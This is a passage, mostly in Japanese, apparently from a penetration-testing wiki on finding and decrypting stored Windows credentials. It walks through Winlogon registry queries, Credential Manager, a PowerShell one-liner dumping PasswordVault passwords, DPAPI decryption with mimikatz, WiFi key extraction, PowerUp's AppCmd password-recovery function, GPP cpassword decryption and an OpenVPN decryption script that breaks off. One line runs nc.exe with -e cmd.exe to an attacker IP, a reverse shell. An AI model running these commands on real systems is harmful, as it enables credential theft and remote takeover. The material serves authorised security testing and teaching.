reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントコンテキストとして扱ってください。空でない `DefaultPassword` または `AltDefaultPassword` の値は、平文のレジストリ情報です。`AutoAdminLogon=1` なのに平文パスワードを読み取れない場合、それは調査の手掛かりにすぎません。[Sysinternals Autologon はパスワードを LSA secret として保存できます](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りだけでは、その secret が存在するか、取得可能かどうかは確認できません。認証情報の露出を報告する前に、アクセス権と実際のログオン設定を確認してください。

### Credential Manager / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>より\
Windows Vault は、サーバー、Web サイト、その他のプログラム用の認証情報を保存します。**Windows** はこれらを使って、**ユーザーを自動的にログインさせる**ことができます。最初は、Facebook、Twitter、Gmail などのサイトの認証情報を保存して、ブラウザーに自動ログインさせられるように聞こえるかもしれませんが、そういう仕組みではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるための認証情報を保存します。つまり、リソース（サーバーまたは Web サイト）へのアクセスに認証情報が必要な **Windows アプリケーションは、この Credential Manager と Windows Vault を利用でき**、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使えます。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの認証情報を利用することはできないと思います。そのため、アプリケーションで vault を利用する場合は、何らかの方法で **Credential Manager と通信し、既定のストレージ vault からそのリソースの認証情報を要求する**必要があります。

`cmdkey` を使用して、マシンに保存されている認証情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、保存された資格情報を使用するために、`/savecred` オプションを指定して `runas` を使用できます。次の例では、SMB share 経由でリモートバイナリを呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された資格情報を使用して `runas` を実行する。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)を使用できる点に注意してください。

### UWP PasswordVault / Credential Locker

最新のWindows UWPアプリケーション、Microsoft Edge、最新のシステムサービスは、認証トークンや平文パスワードを、Universal Windows Platform (UWP) の`PasswordVault`（`vaultcmd`では`Web Credentials`としても表示されます）に保存します。この保存領域はセッションごとに分離されており、管理者権限や`SeDebugPrivilege`がなくても、ネイティブに復号できます。

ユーザーのアクティブなセッション内でこのPowerShellコマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にダンプして復号できます：

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** は、データを対称暗号化する方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムのシークレットを利用して、エントロピーを大幅に高めます。

**DPAPI は、ユーザーのログインシークレットから導出された対称鍵を使用して鍵を暗号化します**。システム暗号化の場合は、システムのドメイン認証シークレットを使用します。

DPAPI を使用して暗号化されたユーザーの RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。ここで `{SID}` はユーザーの [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) を表します。**同じファイル内でユーザーの秘密鍵を保護する master key とともに配置される DPAPI key** は、通常、64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD の `dir` コマンドでは内容を一覧表示できませんが、PowerShell では一覧表示できます。）

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

**mimikatz module** `dpapi::masterkey` に適切な引数（`/pvk` または `/rpc`）を指定して、復号できます。

**マスターパスワードで保護された認証情報ファイル**は、通常次の場所にあります。

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

`/masterkey` を適切に指定して **mimikatz module** の `dpapi::cred` を使用すると、復号できます。\
root 権限があれば、`sekurlsa::dpapi` module を使って **memory** から多数の DPAPI **masterkeys** を **extract** できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell の認証情報

**PowerShell の認証情報**は、暗号化された認証情報を便利に保存する方法として、**scripting** や自動化タスクでよく使用されます。認証情報は **DPAPI** で保護されており、通常は作成時と同じコンピューター上の同じユーザーでのみ復号できます。

エクスポートされた認証情報のファイル名や `.xml` パスは任意です。スクリプトやファイル一覧からファイルを見つけたら、`C:\Users` にあると決めつけず、対象アカウントの実際のプロファイルディレクトリを特定してください。[Windows ではプロファイルを別の場所に配置できます](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルを読み取れることは手がかりにすぎません。[Windows の `Export-Clixml` は、暗号化された認証情報をエクスポートしたユーザーとコンピューターに紐付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復元したアカウントが対象のサービスで有効な権限を持っているかは、別途確認する必要があります。通常の列挙では暗号化値や平文値を出力せず、まずパスと ACL を調べてください。

ファイルに保存された PS 認証情報を **decrypt** するには、次のようにします。

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済みRDP接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Mimikatz の `dpapi::rdg` モジュールを適切な `/masterkey` とともに使用して、**任意の .rdg ファイルを復号する**\
Mimikatz の `sekurlsa::dpapi` モジュールを使うと、メモリから**多数の DPAPI masterkey を抽出できます**

**mRemoteNG は別の接続ストアを使用します。** `%APPDATA%\mRemoteNG` およびユーザーの Documents 内にある読み取り可能な XML を調べます。`config.xml` のような一般的な名前のファイルも対象に含めてください。XML のファイルを認証情報の手掛かりとみなす前に、接続スキーマと暗号化された `Password` 属性を特定してください。保存された値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかは、ファイルの暗号化設定と、カスタム master password が使われたかどうかによって異なります。広範な列挙中に暗号化された値を表示しないでください。

**Remote Desktop Plus のプロファイルエクスポート**も、ユーザーディレクトリや共有管理フォルダーに読み取り可能な状態で保存されていることがあります。以前の形式の `profiles.xml` エクスポートには、`ProfileName`、`Password`、`Secure` 要素を含む `Data/Profile` エントリがあります。パスワード要素が空でない場合は、内容を表示したり平文だと決めつけたりせず、認証情報の手掛かりとして扱ってください。[ベンダーの説明](https://www.donkz.nl/)によると、プロファイルの保護は作成時のアカウントとコンピューターに紐付けることも、より緩い設定にすることもできます。これを根拠にする前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

Windows ワークステーションでは、StickyNotes アプリに**パスワード**などの情報を保存している人がよくいます。これはデータベースファイルだと気付いていない場合があります。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、検索して調べる価値があります。

付箋アプリにパスワードなどの情報を保存している人もいます。Microsoft のパッケージ版 Sticky Notes アプリは、通常、メモを `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` に保存します。古いアプリや別のアプリでは、LevelDB など、ユーザープロファイル内の別のストアが使われる場合があります。SQLite ファイルが見つからないことをメモが存在しない証拠とみなす前に、インストールされているアプリとストレージ形式を特定してください。

Sticky Notes が SQLite の write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、直近にコミットされたメモが含まれないことがあります。データベースの整合性が保たれたコピーとともに、対応する `plum.sqlite-wal` を保管し、利用可能であれば `plum.sqlite-shm` も含めてください。共有メモリのインデックスは再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL ドキュメント](https://www.sqlite.org/wal.html)を参照してください。アカウント名やパスワードを含むメモは、あくまで認証情報の手掛かりです。アカウント、許可されたアクセス、およびパスワードの使い回しはそれぞれ別途確認してください。暗号化されたパスワードマネージャーのレコードから、より高い権限のログインを確認するには、実際の復号キーとアプリケーション固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator であり、High Integrity レベルで実行する必要があります。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、**認証情報**が設定されていて、**復元できる**可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました：

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは**SYSTEM 権限で実行される**ため、**DLL Sideloading に脆弱な場合があります（情報元:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## ファイルとレジストリ（認証情報）

### サポートツールのレジストリに残る認証情報の痕跡

古いリモートサポートのインストール環境では、固定のアプリケーションレジストリキーの下に、パスワード関連の値名が残っていることがあります。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewer の `SecurityPasswordAES` は、バージョン 9 より前では設定済みの固定セッションパスワードを示していました。値名のマーカーは調査の手がかりにすぎません。認証情報を評価する前に、インストールされているバージョン、読み取り可能な値データ、その形式、現在の認証動作を確認してください。リモートサポートのパスワードから、より特権の高い Windows アカウントへ移行できるのは、実際にパスワードが再利用されており、そのアカウントへのアクセスが認可されている場合に限られます。通常の列挙出力に暗号文や復元したパスワードを含めないでください。

### シートが保護された共有スプレッドシート

読み取り可能な共有ブックにアカウントデータが含まれている疑いがある場合は、**ファイルの暗号化**と、ワークシートの保護や非表示列を区別してください。[Microsoft によると](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)、ワークシートの保護は編集を制御するものであり、セキュリティ機能ではありません。それだけでは、ブックの内容が暗号化されていることの証明にはなりません。認可された関連ファイルのみを調査し、広範な列挙中に候補となる秘密情報を表示しないでください。読み取り可能な `.xlsx` のパス、保護されたシート、または非表示列だけでは、認証情報の存在も、アカウントの権限がより高いことも証明できません。実際のデータと現在のアカウント権限は、それぞれ別に確認してください。

### CI サーバーに残る変更パッチ

CI サーバーは、ビルドの完了後も、送信されたソース変更をデータディレクトリに保持している場合があります。[TeamCity のドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes` をリモート実行の変更を保存する場所として説明しています。データディレクトリは設定可能であり、必ずしも `ProgramData` の下にあるとは限りません。読み取り可能なパッチには、認証情報ファイル、暗号化キー、またはその両方を使うスクリプトへの参照が、削除または追加された状態で残っていることがあります。たとえば、PowerShell の `ConvertTo-SecureString -Key` を使う処理には、暗号化文字列だけでなく AES key も必要です。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)では、キーは別途指定すると説明されています。まずアクセス可能なパッチ名だけを確認し、その後、認可の範囲内で関連する内容を調べてください。通常の列挙出力に秘密情報を表示しないでください。パッチのパス、暗号化された値、またはキーへの参照だけでは、有効な認証情報や、より高い権限へのアクセスがあることの証明にはなりません。データディレクトリの ACL を制限し、ビルド変更に秘密情報をコミットしないでください。

### カスタムのローカル管理者パスワードローテーション

独自に作られたパスワードローテーターは、暗号化されたローカル管理者パスワードをローカルサービスに保存し、データストアの認証情報を読み取り可能な `.env` ファイルやアップデーターのバイナリの隣に置いている場合があります。アップデーターのスケジュールタスク、アカウント、設定ファイルの ACL、リスナー、データストアの権限をまとめて確認してください。ループバック限定のデータストアでも、有効な認証情報を持つローカルユーザーからアクセスできますが、認証に成功しただけでは、該当するレコードを読み取る権限があるとは限りません。暗号化のシードやキー素材が暗号文の隣から入手できる場合は、その暗号化を信頼する前に、正確な鍵導出方法を確認してください。公開されたシードから Go の [`math/rand`](https://pkg.go.dev/math/rand) を使って AES キーを決定論的に導出する方式は、そのパスワードの保護には適しません。Go は、このパッケージがセキュリティ上重要な乱数生成には不適切であると説明しています。復元したパスワードをエスカレーション経路とみなす前に、それが現在も有効であり、ローカル Administrators グループのアカウントに属することを確認してください。スケジュールタスク、`.env` のパス、暗号化されたデータだけでは、これらの条件は何も証明されません。通常の列挙出力にパスワードやキー素材を含めないでください。

管理対象のローカル管理者パスワードには [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) を使用してください。ディレクトリまたは Entra を基盤とする保存先とアクセス制御は、カスタムのローカルデータストアとは別のものです。同様に、[Elasticsearch のロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)は、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかを決定します。

### Java サーバープラグインアーカイブと認証情報の再利用

一部の Java サーバープラグインは、サーバーの `plugins` ディレクトリに JAR アーカイブとして配布されています。読み取り可能なカスタムプラグインには、埋め込みサービス認証情報を含む設定やバイトコードが含まれている場合があります。認可されている場合に限ってアーカイブを調査し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスだけでは秘密情報の存在は証明されず、復元したサービスパスワードからより高い権限を得られるのは、それがより特権の高いアカウントにも有効な場合に限られます。該当ファイルの ACL を確認し、再利用された認証情報は別々の秘密情報に置き換えてください。ディレクトリ構成については [PaperMC のプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については [Oracle の JAR ドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfire の組み込みデータベース認証情報

組み込みデータベースを使用する Openfire のインストール環境では、`Openfire\embedded-db` の下に `openfire.script` が置かれている場合があります。現在のアカウントで読み取れる場合は、`OFUSER` レコードと `passwordKey` プロパティを併せて確認してください。Openfire の[ユーザープロバイダーのドキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードはプレーンテキストで保存することも、このプロパティに保持されたキーで暗号化することもできます。復元したパスワードがエスカレーションに関係するのは、より特権の高い ID に対して現在も有効な場合に限られます。ファイル名だけでは、読み取りアクセスも認証情報の再利用も証明されません。このパスは調査の手がかりです。データベースの内容や認証情報を通常の列挙出力に含めないでください。

別のファイルである `Openfire\conf\openfire.xml` からは、外部データベースを使用している場合でも、管理コンソールの設定ポートとバインドインターフェースが分かることがあります。Openfire は通常、管理コンソールをループバックにバインドしますが、リスナーが稼働していれば、ローカルアカウントからそのアドレスにアクセスできます。実際のリスナー、認可された管理者ロール、プラグインのアップロードポリシー、Openfire サービスの ID をまとめて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させられる場合があります。サービスが LocalSystem として実行されていれば、高い権限で実行される可能性があります。一致するアカウントパスワードや読み取り可能な設定パスだけでは、管理コンソールへのアクセスやコード実行は証明されません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロード API プロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの設定

Velociraptor サーバーの設定ファイルは一般に `server.config.yaml` という名前で、内部 CA の `CA.private_key` が含まれている場合があります。権限の低いユーザーがそのキーを読み取れる場合、API クライアント証明書を発行できる可能性があります。これがより高い権限につながるかどうかは、サーバーのユーザーロール、API への到達性、サーバーまたは対象エージェントが実行される ID によって異なります。クライアント設定には別の素材が含まれます。クライアント設定が見つかっても、サーバー CA へのアクセスがあるとは限りません。CA の秘密鍵をオフラインで保管するデプロイもあるため、読み取り可能なサーバー設定に署名キーが含まれていない場合もあります。

Windows サーバーでは、インストールディレクトリにある**サーバー**設定ファイルと、保護されたバックアップコピーの ACL を確認してください。場所の例は `%ProgramFiles%\VelociraptorServer\server.config.yaml` です。異なる場合は、サービスに設定されたパスを使用してください。現在の ID がファイルを読み取れること、および `CA.private_key` が実際に存在することを確認してください。ログや列挙出力に秘密鍵を表示しないでください。ベンダーの `config api_client` ワークフローでは CA キーを使ってクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。そのロールの作成や変更には、データストアへの書き込みアクセスまたは再起動が必要な場合があります。これらの書き込みができなくても、既存の特権サーバー ID が経路となる可能性があります。実行権限のある API クエリは、該当するサーバーまたはエージェントのコンテキストで実行され、非常に高い権限を持つ場合があります。

サーバー設定ファイルとバックアップは制限的な ACL で保護し、可能な場合は CA 署名キーをオフラインで保管し、API ロールとリスナーへのアクセスを制限してください。[Velociraptor API ドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)と[セキュリティ設定のガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Putty 認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY は独立したセッションマネージャーです。ネイティブの暗号化ストアは `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat` にある場合があり、エクスポートされたセッションのバックアップは `sessions-backup.dat` という名前で別の場所に保存されている場合があります。[SolarWinds のエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートはパスワードで暗号化され、セッション、キー、スクリプト、タグ、関連付けを含む場合があります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)では、ネイティブストアの場所が示されています。まずファイルの権限とパスを確認してください。いずれかのファイルを見つけても、そのパスワードが判明するわけではなく、保存された認証情報が現在も有効であることや、より高い権限を持つことの証明にもなりません。

### PuTTY SSH ホストキー

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内のSSHキー

SSH秘密鍵はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されている場合があるため、興味深い情報がないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリが見つかった場合、保存された SSH key である可能性が高いです。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、起動時に自動で開始するようにしたい場合は、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この手法はもう有効ではないようです。ssh keysを作成して`ssh-add`で追加し、sshでマシンにログインしようとしました。レジストリHKCU\Software\OpenSSH\Agent\Keysは存在せず、procmonでも非対称鍵認証中に`dpapi.dll`が使用されていることを確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

これらのファイルは、**metasploit**を使って検索することもできます: _post/windows/gather/enum_unattend_

例の内容:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルにも、オフラインの `SAM`、`SECURITY`、`SYSTEM` ハイブが含まれている場合があります。ローカルからアクセスできるバックアップまたはイメージのディレクトリを優先して確認し、何かを抽出する前にイメージの**メンバー名**を調べてください。`.wim` というファイル名だけではハイブが露出している証拠にはならず、通常の `install.wim`、`boot.wim`、リカバリーイメージは誤検出のよくある例です。SMB共有は別のアクセス経路であり、その共有が調査対象に含まれる場合にのみ確認してください。Microsoft の [Windows イメージに関するガイダンス](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) と [レジストリハイブファイルのリファレンス](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します。

### Cached GPP Password

以前は、Group Policy Preferences（GPP）を使用して、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。第一に、SYSVOL内にXMLファイルとして保存されているGroup Policy Object（GPO）は、すべてのドメインユーザーがアクセスできました。第二に、公開されている既定の鍵を使用してAES256で暗号化されたGPP内のパスワードは、認証済みユーザーなら誰でも復号できました。そのため、ユーザーが昇格した権限を取得できる深刻なリスクがありました。

このリスクを軽減するため、空でない「cpassword」フィールドを含む、ローカルにキャッシュされたGPPファイルを検索する関数が開発されました。このようなファイルが見つかると、関数はパスワードを復号し、カスタムのPowerShellオブジェクトを返します。このオブジェクトには、GPPとファイルの場所に関する詳細が含まれており、このセキュリティ脆弱性の特定と修正に役立ちます。

以下のファイルを、`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（W Vistaより前）_ で検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPasswordを復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexecを使ってパスワードを取得する:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例：

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

古い ZIP バックアップが公開されている webroot に直接置かれていると、過去の設定ファイルや再利用可能な認証情報が漏えいする可能性があります。これを情報漏えいと判断する前に、サイトに設定された物理パスと、アーカイブに HTTP 経由で実際にアクセスできるかを確認してください。デフォルトの `C:\inetpub\wwwroot` は候補のひとつにすぎません。アーカイブを開かずに名前とサイズを一覧表示するには、ローカルで簡単なインベントリを実行できます。

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

アーカイブ名だけでは、内部に秘密情報が含まれていることも、回収した認証情報によってより高い権限が得られることも証明できません。

### OpenVPN 認証情報

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
